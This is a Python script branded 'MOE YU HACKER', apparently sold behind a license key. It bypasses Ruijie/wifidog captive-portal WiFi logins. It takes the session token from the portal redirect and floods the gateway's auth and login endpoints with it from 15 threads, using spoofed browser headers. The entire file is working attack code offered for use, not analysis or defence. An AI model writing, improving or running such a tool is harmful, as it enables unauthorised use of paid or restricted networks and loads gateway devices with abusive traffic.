import requests
import re
import urllib3
import time
import threading
import random
import sys
import datetime
import os
import uuid
from urllib.parse import urlparse, parse_qs
from rich.console import Console
from rich.panel import Panel
from rich.align import Align

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
PING_THREADS = 15

# TERMINAL COLORS (Fixed formatting)
G = "\033[1;92m" # Bold Green
C = "\033[1;96m" # Bold Cyan
R = "\033[1;91m" # Bold Red
Y = "\033[1;93m" # Bold Yellow
W = "\033[0m"    # Reset

# BANNER
BANNER = """[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      M O E   Y U   H A C K E R
[/]"""

# ===============================
# SECURITY SYSTEM
# ===============================

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    if os.path.exists(id_file):
        with open(id_file, "r") as f: return f.read().strip()
    new_id = f"MOE-{str(uuid.uuid4())[:8].upper()}-{random.randint(100, 999)}"
    with open(id_file, "w") as f: f.write(new_id)
    return new_id

def check_license():
    my_hwid = get_hwid()
    console.clear()
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(f"HWID: [yellow]{my_hwid}[/]", title="[red]SECURITY[/]", expand=False)))
    try:
        user_key = input(f"\n  {W}[KEY] @MoeYu_").strip()
        if not user_key: sys.exit()
        
        res = requests.get(KEY_URL, timeout=10).text
        if user_key in res:
            console.print(f"{G}>>> AUTHENTICATING... ACCESS GRANTED!{W}")
            return True
        else:
            console.print(f"{R}❌ INVALID KEY!{W}")
            sys.exit()
    except:
        console.print(f"{R}📡 CONNECTION ERROR!{W}")
        sys.exit()

# ===============================
# CORE BYPASS ENGINE v14.0
# ===============================

def start_bypass_process():
    console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS PRO ACTIVATED 🔥[/bold white]"), border_style="red", expand=False))
    
    session = requests.Session()
    # Ruijie Server ကို လှည့်စားရန် Browser Header အပြည့်အစုံ
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    })

    while True:
        try:
            # အင်တာနက် စစ်ဆေးခြင်း
            check = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            
            if check.status_code == 204:
                sys.stdout.write(f"\r{G}[✓] STATUS: ONLINE | ENJOY YOUR INTERNET! ✅ {W}")
                sys.stdout.flush()
                time.sleep(10)
                continue

            # Redirect ဖြစ်သွားလျှင် URL ထဲမှ Parameter များ ဆွဲထုတ်ခြင်း
            portal_url = check.url
            query = parse_qs(urlparse(portal_url).query)
            
            # Ruijie logic အသစ် (chap_challenge) ကို အဓိကထားဖတ်ခြင်း
            sid = (query.get('chap_challenge', [None])[0] or 
                   query.get('sessionId', [None])[0] or 
                   query.get('token', [None])[0])
            
            gw_ip = query.get('gw_address', [None])[0] or urlparse(portal_url).netloc.split(':')[0]
            gw_port = query.get('gw_port', ['2060'])[0]

            if sid and gw_ip:
                # Gateway Link များ တည်ဆောက်ခြင်း
                auth_link = f"http://{gw_ip}:{gw_port}/wifidog/auth?token={sid}"
                login_post = f"http://{gw_ip}:{gw_port}/wifidog/login?token={sid}"
                
                def pulse_attack():
                    while True:
                        try:
                            # တစ်ပြိုင်နက်တည်းမှာ Auth ရော Login Request ပါ Inject လုပ်ခြင်း
                            session.get(auth_link, timeout=5)
                            session.get(login_post, timeout=5)
                            sys.stdout.write(f"\r{C}[!] Injecting: {gw_ip} | Token: {sid[:15]}... | Turbo Active {W}")
                            sys.stdout.flush()
                        except: pass
                        time.sleep(0.08) 

                for _ in range(PING_THREADS):
                    threading.Thread(target=pulse_attack, daemon=True).start()
                
                # အင်တာနက် စတင်ပွင့်လာရန် ခေတ္တစောင့်ခြင်း
                for _ in range(12):
                    try:
                        if session.get("http://www.google.com", timeout=3).status_code == 200:
                            break
                    except: pass
                    time.sleep(1)
            else:
                console.print(f"{R}[×] Failed to Capture Token. Please open Portal in Browser once!{W}")
                time.sleep(5)

        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    try:
        if check_license():
            start_bypass_process()
    except KeyboardInterrupt:
        console.print(f"\n{R}[!] Stopping Engine...{W}")
        sys.exit()
